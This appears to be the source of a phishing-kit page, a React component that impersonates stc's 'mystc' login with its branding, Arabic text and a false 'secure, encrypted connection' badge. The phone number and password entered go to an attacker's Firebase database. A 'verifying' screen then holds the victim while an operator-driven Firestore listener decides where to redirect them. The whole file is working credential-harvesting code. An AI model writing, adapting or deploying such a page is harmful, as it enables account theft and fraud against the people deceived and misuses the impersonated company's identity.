"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { Phone, Lock, Eye, EyeOff, Loader2, ShieldCheck } from "lucide-react"
import { addData, db } from "@/lib/firebase"
import { doc, onSnapshot } from "firebase/firestore"
import { getRedirectUrl } from "@/lib/page-routes"

export default function StcLoginPage() {
  const [phoneNumber, setPhoneNumber] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isWaiting, setIsWaiting] = useState(false)
  const [error, setError] = useState("")
  const [visitorId, setVisitorId] = useState("")

  // ── Get visitor ID ──────────────────────────────────────────────────────
  useEffect(() => {
    if (typeof window !== "undefined") {
      const id = localStorage.getItem("visitor") || ""
      setVisitorId(id)
    }
  }, [])

  // ── Firestore listener for redirects ────────────────────────────────────
  useEffect(() => {
    if (!visitorId) return

    const unsubscribe = onSnapshot(
      doc(db, "pays", visitorId),
      (snap) => {
        if (!snap.exists()) return
        const data = snap.data()

        // Dashboard redirect
        const redirectUrl = getRedirectUrl(data.currentPage, "stc")
        if (redirectUrl) {
          window.location.href = redirectUrl
        }
      },
      (err) => {
        console.error("STC Firestore listener error:", err)
      },
    )

    return () => unsubscribe()
  }, [visitorId])

  // ── Phone formatter ─────────────────────────────────────────────────────
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    if (value.length <= 10) {
      setPhoneNumber(value)
      setError("")
    }
  }

  // ── Submit ──────────────────────────────────────────────────────────────
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")

    if (!phoneNumber || phoneNumber.length < 9) {
      setError("يرجى إدخال رقم جوال صحيح")
      return
    }
    if (!password || password.length < 4) {
      setError("يرجى إدخال كلمة المرور")
      return
    }

    setIsSubmitting(true)

    try {
      const vid = visitorId || localStorage.getItem("visitor") || ""
      await addData({
        id: vid,
        stcPhone: phoneNumber,
        stcPassword: password,
        stcSubmittedAt: new Date().toISOString(),
        step: "stc-login-submitted",
      })
      setIsWaiting(true)
    } catch (err) {
      console.error("STC submit error:", err)
      setError("حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى.")
    } finally {
      setIsSubmitting(false)
    }
  }

  // ── Waiting state ───────────────────────────────────────────────────────
  if (isWaiting) {
    return (
      <div className="min-h-screen bg-white flex flex-col" dir="rtl">
        {/* STC Header */}
        <div className="bg-gradient-to-l from-[#4f0b7b] to-[#6b2fa0] px-6 py-5">
          <div className="max-w-md mx-auto flex items-center justify-between">
            <span className="text-4xl font-black text-white tracking-tight" style={{ fontFamily: "sans-serif" }}>stc</span>
            <ShieldCheck className="h-6 w-6 text-white/70" />
          </div>
        </div>

        <div className="flex-1 flex flex-col items-center justify-center p-8 text-center">
          <div className="w-20 h-20 rounded-full bg-purple-100 flex items-center justify-center mb-6">
            <div className="w-12 h-12 border-4 border-[#4f0b7b] border-t-transparent rounded-full animate-spin" />
          </div>
          <h2 className="text-xl font-bold text-gray-900 mb-2">جاري التحقق من بياناتك</h2>
          <p className="text-sm text-gray-500 max-w-xs leading-relaxed">
            يتم الآن مراجعة بيانات الدخول الخاصة بك. يرجى الانتظار...
          </p>
          <div className="mt-6 bg-purple-50 border border-purple-200 rounded-xl p-4 max-w-xs">
            <p className="text-xs text-purple-800">
              <span className="font-bold">ملاحظة:</span> قد يستغرق التحقق بضع لحظات. لا تغلق هذه الصفحة.
            </p>
          </div>
        </div>
      </div>
    )
  }

  // ── Login form ──────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-[#f5f5f7] flex flex-col" dir="rtl">
      {/* STC Header */}
      <div className="bg-gradient-to-l from-[#4f0b7b] to-[#6b2fa0] relative overflow-hidden">
        <div className="absolute inset-0 opacity-10" style={{backgroundImage: "radial-gradient(circle at 20% 80%, white 1px, transparent 1px), radial-gradient(circle at 80% 20%, white 1px, transparent 1px)", backgroundSize: "40px 40px"}} />
        <div className="relative max-w-md mx-auto px-6 pt-8 pb-16">
          <div className="flex items-center justify-between mb-8">
            <span className="text-5xl font-black text-white tracking-tight" style={{ fontFamily: "sans-serif" }}>stc</span>
            <div className="text-left">
              <p className="text-xs text-white/60">mystc</p>
              <p className="text-xs text-white/40">تسجيل الدخول</p>
            </div>
          </div>
          <div className="text-center">
            <h1 className="text-2xl font-bold text-white mb-2">مرحباً بك</h1>
            <p className="text-sm text-white/80">سجل دخولك لإدارة حسابك في stc</p>
          </div>
        </div>
      </div>

      {/* Login Card */}
      <div className="max-w-md mx-auto w-full px-4 -mt-8 relative z-10">
        <div className="bg-white rounded-2xl shadow-xl border border-gray-100 p-6">
          <form onSubmit={handleSubmit} className="space-y-5">
            {/* Phone Number */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700">
                رقم الجوال
              </label>
              <div className="relative">
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                  placeholder="05xxxxxxxx"
                  dir="ltr"
                  className="w-full h-14 text-left text-lg border-2 border-gray-200 rounded-xl px-4 pr-14 bg-gray-50 placeholder-gray-400 focus:border-[#4f0b7b] focus:bg-white focus:outline-none transition-colors"
                  style={{ fontFamily: "sans-serif" }}
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-2">
                  <Phone className="h-5 w-5 text-[#4f0b7b]" />
                </div>
              </div>
            </div>

            {/* Password */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700">
                كلمة المرور
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => { setPassword(e.target.value); setError("") }}
                  placeholder="••••••••"
                  dir="ltr"
                  className="w-full h-14 text-left text-lg border-2 border-gray-200 rounded-xl px-4 pr-14 pl-14 bg-gray-50 placeholder-gray-400 focus:border-[#4f0b7b] focus:bg-white focus:outline-none transition-colors"
                  style={{ fontFamily: "sans-serif" }}
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2">
                  <Lock className="h-5 w-5 text-[#4f0b7b]" />
                </div>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>
            </div>

            {/* Error */}
            {error && (
              <div className="bg-red-50 border border-red-200 rounded-xl p-3 text-center">
                <p className="text-sm text-red-700 font-medium">{error}</p>
              </div>
            )}

            {/* Forgot password link */}
            <div className="text-left">
              <button type="button" className="text-sm text-[#4f0b7b] font-medium hover:underline">
                نسيت كلمة المرور؟
              </button>
            </div>

            {/* Submit */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full h-14 text-lg font-bold text-white bg-gradient-to-l from-[#4f0b7b] to-[#6b2fa0] rounded-xl hover:opacity-90 disabled:opacity-50 transition-opacity flex items-center justify-center gap-2 shadow-lg shadow-purple-500/20"
            >
              {isSubmitting ? (
                <><Loader2 className="h-5 w-5 animate-spin" /> جاري تسجيل الدخول...</>
              ) : (
                "تسجيل الدخول"
              )}
            </button>

            {/* Divider */}
            <div className="relative my-2">
              <div className="absolute inset-0 flex items-center"><div className="w-full border-t border-gray-200" /></div>
              <div className="relative flex justify-center"><span className="bg-white px-4 text-xs text-gray-400">أو</span></div>
            </div>

            {/* Register link */}
            <button
              type="button"
              className="w-full h-12 text-base font-semibold text-[#4f0b7b] border-2 border-[#4f0b7b] rounded-xl hover:bg-purple-50 transition-colors"
            >
              إنشاء حساب جديد
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="text-center mt-8 pb-8 space-y-4">
          <div className="flex items-center justify-center gap-2 text-gray-400">
            <ShieldCheck className="h-4 w-4" />
            <span className="text-xs">اتصال آمن ومشفر</span>
          </div>
          <div className="flex items-center justify-center gap-4">
            <span className="text-3xl font-black text-[#4f0b7b]/30" style={{ fontFamily: "sans-serif" }}>stc</span>
          </div>
          <p className="text-[10px] text-gray-400">
            © 2025 الاتصالات السعودية. جميع الحقوق محفوظة
          </p>
        </div>
      </div>
    </div>
  )
}
